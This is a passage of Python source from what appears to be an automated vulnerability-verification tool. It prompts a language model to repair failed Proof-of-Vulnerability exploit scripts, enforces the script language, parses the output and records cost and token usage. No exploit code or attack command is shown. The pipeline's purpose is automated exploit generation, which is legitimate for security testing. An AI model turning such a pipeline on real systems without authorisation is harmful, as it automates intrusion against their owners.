                validation_errors=prompt_inputs["validation_errors"],
                attempt_number=attempt_number,
                target_language=_refine_pov_lang,  # ← PoV language, not repo language
                exploit_contract=prompt_support["exploit_contract"],
                runtime_feedback=prompt_support["runtime_feedback"],
                subcommands=normalized_contract.get('known_subcommands') or None,
                probe_context=probe_context or '',
                observed_surface=(effective_runtime_feedback or {}).get('observed_surface') or {},
            )
            llm = self._get_llm(model_name, purpose="refinement")

            # Build a language-enforcement system message. If the previous attempt failed
            # due to a language mismatch (model wrote JS when Python was needed), add an
            # explicit correction instruction to override any tendency to repeat it.
            _lang_mismatch_in_errors = any(
                'language mismatch' in str(e).lower() or 'regenerate in' in str(e).lower()
                for e in (validation_errors or [])
            )
            _lang_correction = (
                f" CRITICAL: the previous attempt used the WRONG scripting language. "
                f"You MUST write {_refine_lang_label} — do NOT write any other language."
            ) if _lang_mismatch_in_errors else ""

            # Universal refinement system message — applies to ALL models.
            refine_sys = (
                "You are a security researcher fixing a failed Proof-of-Vulnerability script. "
                f"Output ONLY the fixed ```{_refine_pov_lang} script block (preceded by ```json proof-plan if needed). "
                f"Write {_refine_lang_label} code only — never switch the PoV language."
                f"{_lang_correction} "
                "Do NOT use --help, --version, or bare binary invocation. "
                "Do NOT redeclare TARGET_BINARY, TARGET_BIN, or CODEBASE_PATH inside any function."
                " /no_think"
            )
            messages = [
                SystemMessage(content=refine_sys),
                HumanMessage(content=prompt)
            ]
            
            response = llm.invoke(messages)
            # Strip <think> blocks before parsing (qwen3/reasoning models)
            raw_refine_response = self._strip_think_blocks(response.content)
            parsed = self._parse_pov_payload(raw_refine_response, cwe_type, explanation, vulnerable_code, filepath=filepath)
            pov_script = parsed["pov_script"]
            if not str(pov_script or '').strip():
                raise VerificationError("Model did not return executable PoV code")
            refined_contract_seed = self._merge_refined_contract(normalized_contract, parsed["exploit_contract"] or {})
            _refined_contract = self._normalize_exploit_contract(refined_contract_seed, cwe_type, explanation, vulnerable_code, filepath=filepath)
            _refined_contract['contract_audit'] = self.audit_handoff(_refined_contract, cwe_type, explanation, vulnerable_code, filepath=filepath, runtime_feedback=(_refined_contract or {}).get('runtime_feedback') or {}, phase='refinement')
            
            usage_details = extract_usage_details(response, agent_role="pov_refinement")
            actual_cost = usage_details["cost_usd"]
            token_usage = usage_details["token_usage"]
            openrouter_usage = usage_details["openrouter_usage"]
            
            # Clean up markdown code blocks and bare language-tag prefix if present
            if "```python" in pov_script:
                pov_script = pov_script.split("```python")[1].split("```")[0].strip()
            elif "```javascript" in pov_script:
                pov_script = pov_script.split("```javascript")[1].split("```")[0].strip()
            elif "```" in pov_script:
                pov_script = pov_script.split("```")[1].split("```")[0].strip()
            pov_script = self._strip_language_prefix(pov_script)
            
            end_time = datetime.utcnow()
            generation_time = (end_time - start_time).total_seconds()
            
            return {
                "success": True,
                "pov_script": pov_script,
                "refinement_time_s": generation_time,
                "timestamp": end_time.isoformat(),
                "model_used": model_name or llm._autopov_model_name,
                "model_mode": "offline" if self._is_offline_model_selected(model_name) else "online",
                "cost_usd": actual_cost,
                "token_usage": token_usage,
                "attempt_number": attempt_number,
                "exploit_contract": _refined_contract,
                "openrouter_usage": openrouter_usage
            }
            
        except Exception as e:
            end_time = datetime.utcnow()
            return {
                "success": False,
                "error": str(e),
                "pov_script": failed_pov,  # Return original on failure
                "refinement_time_s": (end_time - start_time).total_seconds(),
                "timestamp": end_time.isoformat()
            }


# Global verifier instance
verifier = VulnerabilityVerifier()


def get_verifier() -> VulnerabilityVerifier:
    """Get the global verifier instance"""
    return verifier



